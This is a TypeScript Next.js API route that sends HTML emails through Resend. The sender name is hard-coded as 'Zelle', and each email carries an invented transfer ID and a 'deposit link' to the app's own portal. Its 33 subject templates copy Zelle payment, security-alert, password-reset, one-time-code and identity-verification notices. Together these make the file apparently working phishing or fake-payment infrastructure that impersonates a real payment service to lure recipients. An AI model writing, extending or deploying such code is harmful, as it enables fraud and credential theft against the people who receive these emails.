import { NextResponse } from "next/server"
import { generateEmailByTemplateId } from "@/lib/email-template-generators"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const {
      recipientEmail,
      recipientName,
      amount,
      message,
      securityQuestion,
      securityAnswer,
      templateId,
      language,
    } = body

    // Validate required fields
    if (!recipientEmail || !recipientName || !amount) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(recipientEmail)) {
      return NextResponse.json({ error: "Invalid email address" }, { status: 400 })
    }

    // Validate amount
    const amountNum = Number.parseFloat(String(amount).replace(/,/g, ""))
    if (isNaN(amountNum) || amountNum <= 0) {
      return NextResponse.json({ error: "Invalid amount" }, { status: 400 })
    }

    // Check for Resend API key
    const resendApiKey = process.env.RESEND_API_KEY
    if (!resendApiKey) {
      console.error("[v0] RESEND_API_KEY is not set")
      return NextResponse.json(
        { error: "Email service not configured. Please add RESEND_API_KEY to environment variables." },
        { status: 500 },
      )
    }

    const transferId = `ZELLE-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
    const timestamp = new Date().toISOString()

    // Build deposit link — use the app's own origin so the link works in any environment
    const appOrigin =
      process.env.NEXT_PUBLIC_APP_URL?.replace(/\/$/, "") ||
      (request.headers.get("origin") ?? request.headers.get("referer")?.replace(/\/[^/]*$/, "") ?? "")
    const depositParams = new URLSearchParams({
      transferId,
      amount: amountNum.toString(),
      recipient: recipientEmail,
      recipientName,
      bankName: "Banking System",
      message: message || "",
      timestamp,
    })
    const depositLink = `${appOrigin}/deposit-portal/client?${depositParams.toString()}`

    // Resolve template ID — fall back to transfer-received for /send page
    const resolvedBase = templateId || "transfer-received"
    const resolvedId = language === "fr" ? `${resolvedBase}-fr` : resolvedBase



    // Generate email HTML using the 33-template system
    const emailHtml = generateEmailByTemplateId(resolvedId, {
      recipientName,
      amount: amountNum,
      message: message || undefined,
      securityQuestion: securityQuestion || undefined,
      securityAnswer: securityAnswer || undefined,
      transferId,
      depositLink,
      senderName: "QuantumYield Treasury",
      institution: "QuantumYield | Treasury & Vault Portal",
      bankName: "QuantumYield",
    })

    if (!emailHtml) {
      console.error("[v0] Unknown template ID:", resolvedId)
      return NextResponse.json({ error: `Unknown template: ${resolvedId}` }, { status: 400 })
    }

    // Build subject based on template type
    const subjectMap: Record<string, string> = {
      "transfer-received":         `You've received a Zelle payment for ${formatAmount(amountNum)}`,
      "transfer-sent":             `Your Zelle payment of ${formatAmount(amountNum)} was sent`,
      "transfer-pending":          `Action Required: Zelle payment of ${formatAmount(amountNum)} pending`,
      "transfer-cancelled":        `Your Zelle payment of ${formatAmount(amountNum)} was cancelled`,
      "transfer-expired":          `Your Zelle payment of ${formatAmount(amountNum)} has expired`,
      "deposit-completed":         `Your Zelle deposit of ${formatAmount(amountNum)} is complete`,
      "deposit-failed":            `Action Required: Your Zelle deposit of ${formatAmount(amountNum)} failed`,
      "deposit-reminder":          `Reminder: Unclaimed Zelle payment of ${formatAmount(amountNum)}`,
      "deposit-instructions":      `How to deposit your Zelle payment`,
      "auto-deposit-enabled":      `Zelle Auto-Deposit Enabled`,
      "security-question-updated": `Your Zelle security settings were updated`,
      "suspicious-activity":       `Security Alert: Unusual activity on your Zelle account`,
      "password-reset":            `Reset your Zelle account password`,
      "two-factor-enabled":        `Two-Factor Authentication Enabled`,
      "login-notification":        `New sign-in to your Zelle account`,
      "account-verified":          `Your Zelle account has been verified`,
      "profile-updated":           `Your Zelle profile was updated`,
      "bank-linked":               `Bank account linked to Zelle successfully`,
      "limit-increase":            `Your Zelle transfer limit has been increased`,
      "money-request":             `${recipientName} is requesting ${formatAmount(amountNum)} via Zelle`,
      "request-accepted":          `Your Zelle money request was accepted`,
      "request-declined":          `Your Zelle money request was declined`,
      "transfer-receipt":          `Your Zelle payment receipt`,
      "scheduled-transfer":        `Reminder: Scheduled Zelle payment tomorrow`,
      "deposit-on-hold":           `Your Zelle deposit is temporarily on hold`,
      "two-factor-code":           `Your Zelle one-time verification code`,
      "welcome-onboard":           `Welcome to Zelle via QuantumYield`,
      "account-suspended":         `Your Zelle account has been temporarily suspended`,
      "referral-bonus":            `You've earned a Zelle referral bonus!`,
      "kyc-verification":          `Action Required: Verify your Zelle identity`,
      "aml-hold":                  `Zelle transaction hold — compliance review`,
      "monthly-statement":         `Your Zelle monthly statement is ready`,
      "large-transaction-review":  `Large Zelle transaction — additional verification required`,
    }

    const subject =
      subjectMap[resolvedBase] ||
      `Zelle Payment Notification — ${formatAmount(amountNum)}`

    // Prefix subject with [FR] indicator when French
    const finalSubject = language === "fr" ? `[FR] ${subject}` : subject

    // ── Build and sanitize the `from` address ────────────────────────────────
    // Resend requires one of:
    //   • "email@verified-domain.com"
    //   • "Display Name <email@verified-domain.com>"
    // The env var RESEND_FROM_EMAIL should be the raw email address only (e.g. "noreply@yourdomain.com")
    // or a full formatted string. We always inject the "Zelle" display name.
    const SENDER_NAME = "Zelle"
    const rawFromEnv  = (process.env.RESEND_FROM_EMAIL || "").trim()

    // Extract just the email address from the env value (strip any existing display name wrapper)
    const emailOnly = rawFromEnv.includes("<")
      ? rawFromEnv.match(/<([^>]+)>/)?.[1]?.trim() ?? rawFromEnv
      : rawFromEnv

    // Validate the extracted email
    const fromEmailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailOnly || !fromEmailRegex.test(emailOnly)) {
      console.error("[send-zelle] RESEND_FROM_EMAIL is missing or malformed:", rawFromEnv)
      return NextResponse.json(
        {
          error:
            "Email service is misconfigured: RESEND_FROM_EMAIL must be a valid address " +
            "(e.g. noreply@yourdomain.com). Please update it in the Vars settings.",
        },
        { status: 500 },
      )
    }

    // Compose the final `from` string Resend will accept
    const fromAddress = `${SENDER_NAME} <${emailOnly}>`

    if (emailOnly.endsWith("@resend.dev")) {
      console.warn(
        "[send-zelle] Using a @resend.dev sender — Resend only delivers to the verified account owner. " +
        "Set RESEND_FROM_EMAIL to an address on your verified domain.",
      )
    }

    // ── Send via Resend ───────────────────────────────────────────────────────
    const resendPayload = {
      from:    fromAddress,
      to:      [recipientEmail],
      subject: finalSubject,
      html:    emailHtml,
    }

    const resendResponse = await fetch("https://api.resend.com/emails", {
      method:  "POST",
      headers: {
        Authorization:  `Bearer ${resendApiKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(resendPayload),
    })

    const resendData = await resendResponse.json()

    if (!resendResponse.ok) {
      const errorMsg = resendData?.message || resendData?.name || JSON.stringify(resendData)
      const hint =
        resendResponse.status === 422
          ? ` (422) — The 'from' address "${fromAddress}" was rejected. Ensure RESEND_FROM_EMAIL uses a domain verified in your Resend dashboard.`
          : ""
      console.error("[send-zelle] Resend error:", resendResponse.status, errorMsg, "from:", fromAddress)
      return NextResponse.json(
        { error: `Email delivery failed: ${errorMsg}${hint}` },
        { status: 500 },
      )
    }

    return NextResponse.json({
      success: true,
      transferId,
      emailId: resendData?.id,
      message: "Zelle payment notification sent successfully",
    })
  } catch (error) {
    console.error("[send-zelle] Error in route handler:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}

function formatAmount(n: number): string {
  return new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(n)
}
